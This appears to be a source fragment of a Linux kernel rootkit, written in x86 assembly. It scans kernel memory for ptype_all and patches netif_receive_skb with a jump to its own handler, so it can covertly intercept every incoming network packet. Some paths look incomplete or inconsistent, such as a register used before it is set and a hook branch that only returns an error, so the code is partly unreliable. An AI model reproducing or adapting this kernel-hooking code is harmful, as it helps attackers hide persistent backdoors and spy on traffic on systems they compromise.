// void netif_hook_init();
EXPORT_LABEL(netif_hook_init)
	PUSH_ALL
	subl $0x18, %esp

	// get ptype_all
	GET_VAL32(dev_hard_start_xmit, %eax)
	movl %eax, (%esp)
	movl $0x100, 0x4(%esp)
	call 1f
	.byte 0x00; .long 0x000000ff; .long 0x00000081
	.byte 's'; .byte 0x02; .long 0x000000ff
	.byte 0x00
1:	popl %eax
	movl %eax, 0x8(%esp)
	leal 0x10(%esp), %eax
	movl %eax, 0xc(%esp)
	call xde_find
	testl %eax, %eax
	jz netif_hook_init_out
	movl 0x10(%esp), %ebx

2:	movl 2(%esi), %ebx

#ifdef _DEBUG_
    movl %ebx, 4(%esp) 
    DPRINT("<3>ptype_all at %lx\n"); 
#endif

    cmpl (%ebx), %ebx 
    jz install_ih 
    // if ptype_all is empty, install inline hook at netif_receive_skb 
    // if ptype_all isn't empty, hook ptype_all->next->func 

install_ph: 
    movl (%ebx), %ebx 

#ifdef _DEBUG_
    movl %ebx, 4(%esp) 
    DPRINT("<3>ptype_all's 1st element at %lx, ready to install ptype_all hook\n"); 
#endif
	
	movl $-3, retcode(%esp)
	jmp netif_hook_init_out

install_ih:

#ifdef _DEBUG_
    DPRINT("<3>ptype_all is empty, ready to install inline hook\n"); 
#endif

    GET_VAL32(netif_receive_skb, %esi) 
#ifdef _DEBUG_
    movl %esi, 4(%esp) 
    DPRINT("<3>netif_receive_skb at %lx\n")
	GET_ADDR(ih_netif_receive_skb, %eax)
	movl %eax, 4(%esp)
    DPRINT("<3>ih_netif_receive_skb at %lx\n")
#endif

    // the byte of asm ("ljmp $0x60, $0x12345678") is 
    // ea 78 56 34 12 60 00 
    // now we will fill the ih_nrs_retbuf, and cover the code at ih_addr 

	/*
    movl %ebx, %esi 
    GET_ADDR(ih_nrs_retbuf, %edi) 
    movl $9, %ecx 
    cld; rep movsb 
	*/
	
    leal 9(%esi), %eax 
	GET_ADDR(ih_nrs_retbuf, %edi)
	leal 9(%edi), %edi
	movb $0xea, (%edi) 
    movl %eax, 1(%edi) 
    movw $0x0060, 5(%edi) 

	movl %esi, %edi 
    GET_ADDR(ih_netif_receive_skb, %eax) 
	movb $0xea, (%edi) 
    movl %eax, 1(%edi) 
    movl $0x90900060, 5(%edi)

netif_hook_init_out:
	addl $0x18, %esp
	POP_ALL
	ret


// inline hook of netif_receive_skb 
EXPORT_LABEL(ih_netif_receive_skb)
    pushl %eax 
    pushl %edx

	//DPRINT("<3>netif_receive_skb called\n") 
	call handle_incoming_skb

    popl %edx 
    popl %eax 
ih_nrs_retbuf: 
	push   %ebp       
	push   %edi       	
	push   %esi       
	mov    %eax,%esi  
	push   %ebx       
	sub    $0x18,%esp 
	.fill 20
